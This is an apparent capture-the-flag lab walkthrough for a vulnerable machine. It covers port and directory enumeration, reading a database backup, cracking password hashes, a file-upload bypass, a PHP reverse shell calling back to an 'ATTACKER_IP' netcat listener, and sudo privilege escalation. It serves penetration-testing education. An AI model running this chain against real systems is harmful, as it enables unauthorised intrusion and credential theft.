<img width="1983" height="793" alt="image" src="https://github.com/user-attachments/assets/f47a6162-2afa-4154-9318-0029ae3db4aa" />

# Getting Started: Initial Enumeration

## Learning Objectives

By completing this lab, you will practice:

* Web enumeration
* Directory brute forcing
* Credential extraction
* Password hash cracking
* File upload bypass
* Remote Code Execution (RCE)
* Reverse shell access
* Linux privilege escalation

---

## 1. Target Deployment

Click **Start Machine** and wait for the target to fully deploy.

Once the machine is online, open the web application:

```text
http://MACHINE_IP/
```

> Replace `MACHINE_IP` with the IP address assigned to your target machine.

---

## 2. Initial Enumeration

Start by scanning the target with Nmap.

```bash
nmap -Pn -p- -sC -sV MACHINE_IP -vvv -oA nmap_full
```

<img width="1434" height="882" alt="image" src="https://github.com/user-attachments/assets/63f19e39-588c-4df7-92cd-30a258b6b718" />


### What are we looking for?

* Open ports
* Running services
* Service versions
* Web services
* Potential attack surface

---

## 3. Web Enumeration

If a web service is discovered, begin enumerating hidden directories and files.

### Gobuster

```bash
gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirb/common.txt
```

### Dirb

```bash
dirb http://MACHINE_IP/
```

### Goal

Identify interesting resources such as:

```text
/backup
/admin
/login
/uploads
/config
```

> Pay close attention to directories containing backups, configuration files, login panels, or other sensitive information.

---

## 4. Directory Analysis

Review the directories discovered during enumeration.

Possible findings:

```text
Web Enumeration
      │
      ├── Backup File
      │
      └── Login Panel
```

A publicly accessible backup file may expose sensitive system information.

---

## 5. Backup File — Critical Finding

A backup file may contain:

* Database data
* Usernames
* Password hashes
* Credentials
* Configuration details

If a direct copy of production data is accessible through the web server, this may represent a **Sensitive Data Exposure** issue.

### Possible Attack Path

```text
Backup File
    ↓
Sensitive Data
    ↓
Credentials
    ↓
Login Access
```

---

## 6. Credential Discovery

Inspect the discovered database backup.

```bash
cat mysql-backup.sql
```

Look for credentials or password hashes.

```text
Username: __________________

Password / Hash: __________________
```

Save any discovered credentials for further investigation.

---

## 7. Hash Cracking

If the password is stored as a hash, first identify the hash type and then attempt to recover the plaintext password using an authorized password-recovery tool.

Useful tools include:

* CyberChef
* CrackStation
* Hashes.com
* John the Ripper

### John the Ripper

Example:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Display recovered credentials:

```bash
john --show hash.txt
```

### Result

```text
Username: __________________

Password: __________________
```

---

## 8. Initial Access

Use the discovered credentials against the identified login panel.

```text
Username: __________________
Password: __________________
```

> Prioritize login panels and other interesting directories revealed during Gobuster or Dirb enumeration.

Successful authentication provides access to additional application functionality.

---

## 9. Exploitation — File Upload / RCE

After gaining authenticated access, inspect the application for functionality that could lead to **Remote Code Execution (RCE)**.

One possible attack path is an insecure file upload.

### File Upload Testing

Investigate whether the application accepts executable file extensions such as:

```text
.php
.phtml
.php5
```

For example, if `.php` files are blocked but `.phtml` files are accepted, the upload filter may be insufficient.

### ExploitDB / SearchSploit

Search locally for known exploits related to the discovered application or version.

```bash
searchsploit <application-name>
```

Example:

```bash
searchsploit <application-name> <version>
```

Review an interesting exploit:

```bash
searchsploit -x <exploit-path>
```

---

## 10. Reverse Shell

Start a Netcat listener on the attacking machine.

```bash
nc -lvnp <PORT>
```

### Netcat (`nc`)

Netcat is a networking utility that can:

* Send and receive network data
* Listen for incoming connections
* Receive reverse shell connections

Example:

```bash
nc -lvnp 1234
```

### PHP Reverse Shell

A commonly used lab resource is:

`pentestmonkey/php-reverse-shell`

Modify the callback IP address and port:

```php
$ip = 'ATTACKER_IP';   // CHANGE THIS
$port = 1234;          // CHANGE THIS
```

> `ATTACKER_IP` should be the IP address reachable from the target machine.

Upload the payload through the vulnerable application and trigger it.

### Expected Attack Flow

```text
File Upload
    ↓
Payload Uploaded
    ↓
Payload Triggered
    ↓
Reverse Connection
    ↓
Remote Shell
```

---

## 11. Stabilize the Shell

A basic reverse shell may have limited terminal functionality.

Check whether Python is available:

```bash
which python
```

or:

```bash
which python3
```

Using the **GTFOBins → Python → Shell** reference, you may see commands such as:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

or:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This provides a more interactive shell.

Verify your current context:

```bash
whoami
```

```bash
id
```

---

## 12. User Flag

Search for the user flag.

```bash
find / -type f -name "user.txt" 2>/dev/null
```

Alternative:

```bash
find / -name "user.txt" 2>/dev/null
```

Read the discovered flag:

```bash
cat /path/to/user.txt
```

### Result

```text
User Flag: __________________
```

> Finding `user.txt` confirms successful user-level access.

---

## 13. Privilege Escalation Enumeration

Begin local privilege escalation enumeration.

First, check the current user:

```bash
whoami
```

```bash
id
```

Then inspect sudo permissions:

```bash
sudo -l
```

Look for:

* Commands executable as root
* `NOPASSWD` entries
* Dangerous binaries
* Misconfigured sudo permissions

Example:

```text
User → sudo -l → Misconfiguration → Privilege Escalation
```

---

## 14. Privilege Escalation

If `sudo -l` reveals a vulnerable or misconfigured binary, research whether it can be abused for privilege escalation.

A useful reference is **GTFOBins**.

```text
sudo -l
   ↓
Identify Allowed Binary
   ↓
GTFOBins
   ↓
Privilege Escalation
   ↓
Root
```

After exploiting the identified misconfiguration, verify your privileges:

```bash
whoami
```

Expected result:

```text
root
```

You can also verify with:

```bash
id
```

---

## 15. Root Flag

Once root access is obtained, locate the root flag.

```bash
find / -type f -name "root.txt" 2>/dev/null
```

Then read it:

```bash
cat /root/root.txt
```

### Result

```text
Root Flag: __________________
```

---

# Attack Path Summary

```text
Nmap Enumeration
       ↓
Web Enumeration
       ↓
Directory Brute Force
       ↓
Backup File Discovered
       ↓
Credential Extraction
       ↓
Hash Cracking
       ↓
Authenticated Login
       ↓
File Upload / RCE
       ↓
Reverse Shell
       ↓
User Access
       ↓
sudo -l
       ↓
Misconfiguration
       ↓
Privilege Escalation
       ↓
ROOT
```

---

## Key Takeaways

This lab demonstrates how multiple small security weaknesses can be chained together into a complete compromise.

```text
Information Disclosure
        +
Weak Credential Storage
        +
Insecure File Upload
        +
Sudo Misconfiguration
        =
Full System Compromise
```

The most important lesson is to **enumerate carefully and follow the evidence**. A simple exposed backup file can become the starting point for complete system compromise.

















